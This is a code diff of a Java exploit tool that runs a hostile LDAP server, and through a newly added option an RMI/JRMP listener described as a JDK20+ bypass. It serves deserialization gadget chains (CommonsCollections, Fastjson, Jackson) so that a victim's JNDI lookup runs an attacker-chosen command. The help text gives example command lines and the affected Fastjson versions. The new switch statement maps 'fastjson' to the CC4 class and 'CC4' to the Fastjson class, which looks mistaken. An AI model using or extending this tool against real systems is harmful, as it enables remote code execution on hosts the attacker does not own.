@@ -4,11 +4,10 @@ import com.unboundid.ldap.listener.InMemoryDirectoryServer;
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
 import com.unboundid.ldap.listener.InMemoryListenerConfig;
 import org.apache.commons.cli.*;
-import org.gadget.CC4;
-import org.gadget.CC6;
-import org.gadget.Fastjson;
-import org.gadget.Jackson;
+import org.gadget.*;
+import org.gadget.inter.Gadget;
 import org.interceptor.SerialOperationInterceptor;
+import org.util.GadgetUtils;
 import sun.misc.BASE64Decoder;
 
 import javax.net.ServerSocketFactory;
@@ -31,6 +30,8 @@ public class LDAPRefServer {
         options.addOption("C", "class", true, "低版本动态请求class实例化方式：class文件请求URL（需自己生成class文件，开启web服务）");
         options.addOption("g", "gadget", true, "内置反序列化链");
         options.addOption("c", "cmd", true, "使用内置反序列化链时所要执行的命令（存在空格时请使用双引号包裹）");
+        options.addOption("rmi", "rmi", false, "JDK20+绕过，只支持内置链打法");
+
 
         // 创建命令行解析器
         CommandLineParser parser = new DefaultParser();
@@ -78,19 +79,19 @@ public class LDAPRefServer {
             }
 
             //判断使用的链子
-            byte[] bytes = null;
+            Gadget gadget = null;
             switch (gadgetName){
                 case "fastjson":
-                    bytes = Fastjson.getBytes(command);
+                    gadget = new CC4();
                     break;
                 case "CC6":
-                    bytes = CC6.getBytes(command);
+                    gadget = new CC6();
                     break;
                 case "jackson":
-                    bytes = Jackson.getBytes(command);
+                    gadget = new Jackson();
                     break;
                 case "CC4":
-                    bytes = CC4.getBytes(command);
+                    gadget = new Fastjson();
                     break;
                 default:
                     System.out.println("暂不支持该链！");
@@ -98,16 +99,22 @@ public class LDAPRefServer {
             }
             System.out.println("使用"+ gadgetName +"链");
             System.out.println("执行的命令为：" + command);
-            lanuchLDAPServer(ldap_port, bytes);
+            if(cmd.hasOption("rmi")){
+                System.out.println("使用JDK20+方式");
+                System.out.println("客户端请求：rmi://ip:"+ ldap_port +"/Exploit");
+                new JRMPListener(ldap_port,gadget.getObject(command)).run();
+            }else {
+                lanuchLDAPServer(ldap_port, GadgetUtils.getBytes(gadget,command));
+            }
         }else {
             // 如果未提供选项，输出帮助信息
             HelpFormatter formatter = new HelpFormatter();
             formatter.printHelp("\n【使用】\n" +
-                            "客户端请求：ldap://127.0.0.1:1389/Exploit（名字随意）\n" +
                             "反序列化文件方式：java -jar LDAPDeserialize-tool.jar -p 1389 -f D:/1.ser\n" +
                             "反序列化base64方式：java -jar LDAPDeserialize-tool.jar -p 1389 -b base64数据\n" +
                             "低版本动态请求class：\njava -jar LDAPDeserialize-tool.jar -C http://127.0.0.1:8000/1.class\n" +
                             "内置反序列化链：\njava -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\"\n" +
+                            "JDK20+打法：java -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\" -rmi\n" +
                             "\n\n" +
                             "【目前支持的链】\n" +
                             "fastjson (影响版本：1.2.49-1.2.83)\n" +
@@ -135,6 +142,7 @@ public class LDAPRefServer {
             config.addInMemoryOperationInterceptor(new SerialOperationInterceptor(obj));
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
             System.out.println("Listening on 0.0.0.0:" + ldap_port);
+            System.out.println("客户端请求：ldap://ip:"+ ldap_port +"/Exploit（名字随意）");
             ds.startListening();
         } catch (Exception e) {
             e.printStackTrace();
